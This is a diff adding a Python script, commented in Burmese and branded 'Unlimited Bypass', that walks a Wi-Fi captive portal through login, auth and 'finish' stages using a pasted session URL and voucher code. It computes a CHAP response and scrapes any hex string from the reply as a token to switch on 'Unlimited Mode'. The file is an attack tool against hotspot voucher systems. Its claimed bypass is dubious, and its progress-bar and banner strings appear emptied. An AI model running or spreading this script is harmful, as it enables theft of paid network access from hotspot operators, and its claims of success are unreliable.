@@ -1,0 +1,129 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import requests, urllib.parse, re, hashlib, time, sys
+from colorama import init, Fore, Style
+init(autoreset=True)
+
+# Color setup
+G, R, Y, C, M, W = Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.WHITE
+RESET = Style.RESET_ALL
+
+# -------- လှပသော Progress Bar --------
+def progress_bar(current, total, prefix="Progress", bar_len=40):
+    percent = current / total
+    filled = int(bar_len * percent)
+    bar = f"{G}{'' * filled}{W}{'' * (bar_len - filled)}"
+    return f"\r{prefix} [{bar}] {C}{percent * 100:>6.2f}%{W}"
+
+def step_progress(step_name, delay=0.8):
+    """အဆင့်တစ်ဆင့်စီအတွက် 0% ကနေ 100% ထိ လှပစွာပြပေးမယ်"""
+    sys.stdout.write(f"{Y} {step_name}{W}\n")
+    for i in range(0, 101, 2):
+        sys.stdout.write(progress_bar(i, 100, "   "))
+        sys.stdout.flush()
+        time.sleep(delay / 50)  # 0.8 sec အတွင်း ပြီးမယ်
+    print(" " * 60, end="\r")  # line ကိုရှင်းမယ်
+    print(f"{G} {step_name}  Done.{W}\n")
+
+def banner():
+    print(f"""
+{M}
+{M}{G}          {M}
+{M}{G}         {M}
+{M}{G}             {M}
+{M}{G}             {M}
+{M}{G}        {M}
+{M}{G}          {M}
+{M}
+{M}{C}       PROGRESS EDITION v6.0 (ZORO + SHADOW)         {M}
+{M}{Y}           Unlimited Bypass with Live Bar            {M}
+{M}{W}
+""")
+
+def parse_chap(challenge_str):
+    try: return challenge_str.encode('utf-8').decode('unicode_escape').encode('latin-1')
+    except: return challenge_str.encode('utf-8')
+
+def main():
+    banner()
+    session_url = input(f"{C}[?]{W} Session URL ကို Paste လုပ်ပါ: ").strip()
+    if not session_url: print(f"{R}[-] URL မပါဘူး။"); return
+    voucher = input(f"{C}[?]{W} Voucher Code ထည့်ပါ: ").strip()
+    if not voucher: print(f"{R}[-] Voucher မပါဘူး။"); return
+
+    parsed = urllib.parse.urlparse(session_url)
+    base_params = dict(urllib.parse.parse_qsl(parsed.query))
+    auth_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    print(f"\n{Y}[*]{W} Target ကို ခွဲခြမ်းစိတ်ဖြာနေတယ်...")
+    time.sleep(0.3)
+    print(f"{G}[+] Gateway IP:{W} {base_params.get('gw_address', 'N/A')}")
+    print(f"{G}[+] Client MAC:{W} {base_params.get('mac', 'N/A')}")
+    print(f"{G}[+] SSID:{W} {base_params.get('ssid', 'N/A')}\n")
+
+    s = requests.Session()
+    s.headers.update({'User-Agent': 'Mozilla/5.0', 'Referer': session_url})
+
+    # ---- Progress Step 1: Portal Connection ----
+    step_progress("Portal ကို ချိတ်ဆက်နေတယ် (GET)", 0.6)
+    try:
+        resp_get = s.get(session_url, timeout=10)
+        html = resp_get.text
+    except Exception as e:
+        print(f"{R}[-] Portal မရောက်နိုင်ဘူး: {e}"); return
+
+    # ---- CHAP Response ----
+    chap_raw = base_params.get('chap_challenge', '')
+    chap_response = None
+    if chap_raw:
+        chap_bytes = parse_chap(chap_raw)
+        chap_response = hashlib.md5(chap_bytes + voucher.encode('utf-8')).hexdigest()
+        print(f"{G}[*] CHAP Response ထုတ်ပြီး: {C}{chap_response[:20]}...{W}\n")
+
+    # ---- Progress Step 2: Authentication ----
+    step_progress("Voucher ကို အတည်ပြုနေတယ် (POST / login)", 0.8)
+    payload = base_params.copy()
+    payload['stage'] = 'login'
+    payload['voucher'] = voucher
+    if chap_response:
+        payload['chap_response'] = chap_response
+        payload['chap_id'] = base_params.get('chap_id', '')
+
+    resp = s.post(auth_url, data=payload, timeout=15)
+    if resp.status_code != 200:
+        print(f"{R}[-] Auth မအောင်မြင်ဘူး: {resp.status_code}{W}")
+
+    token_match = re.search(r'(?:token|auth_token|sid)[\s:=]+([a-f0-9]{32,64})', resp.text, re.I)
+    if not token_match:
+        token_match = re.search(r'[a-f0-9]{32,64}', resp.text)
+
+    if not token_match:
+        print(f"{Y}[!] stage=login မရဘူး။ stage=auth နဲ့ ပြန်စမ်းမယ်...{W}")
+        payload['stage'] = 'auth'
+        resp = s.post(auth_url, data=payload, timeout=15)
+        token_match = re.search(r'[a-f0-9]{32,64}', resp.text)
+
+    if token_match:
+        token = token_match.group(0) if isinstance(token_match.group(0), str) else token_match.group(1)
+        print(f"{G}[!] Token ရပြီ: {Y}{token}{W}\n")
+
+        # ---- Progress Step 3: Finalize / Unlimited ----
+        step_progress("Unlimited Mode ကို အသက်သွင်းနေတယ် (POST / finish)", 1.0)
+        finish_payload = base_params.copy()
+        finish_payload['stage'] = 'finish'
+        finish_payload['token'] = token
+        final_resp = s.post(auth_url, data=finish_payload, timeout=10)
+
+        if final_resp.status_code == 200:
+            print(f"\n{G}{'='*55}{W}")
+            print(f"{G}    UNLIMITED ကို အောင်မြင်စွာ ပြောင်းလိုက်ပြီ    {W}")
+            print(f"{G}{'='*55}{W}")
+        else:
+            print(f"{R}[-] Finalize မအောင်မြင်ဘူး: {final_resp.status_code}{W}")
+            print(f"{Y}[!] Token ကောင်းနေနိုင်တယ်။ Browser မှာ ကိုယ်တိုင်စမ်းကြည့်။{W}")
+    else:
+        print(f"{R}[-] Token လုံးဝမတွေ့ဘူး။ Voucher မှားနေတာ ဒါမှမဟုတ် Gateway က ကာကွယ်ထားတာ။{W}")
+
+if __name__ == "__main__":
+    main()
